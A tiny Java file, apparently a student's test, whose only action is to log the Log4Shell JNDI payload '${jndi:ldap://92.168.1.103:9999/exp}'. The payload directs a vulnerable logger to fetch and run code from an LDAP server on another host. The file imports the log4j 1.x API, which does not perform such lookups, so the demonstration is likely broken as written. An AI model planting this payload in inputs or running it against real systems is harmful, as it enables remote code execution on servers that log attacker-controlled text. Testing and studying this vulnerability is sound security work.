package STUD.LiuZheng;

import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;



public class Log {
    private static final Logger logger = LogManager.getLogger(Log.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://92.168.1.103:9999/exp}");
    }
}
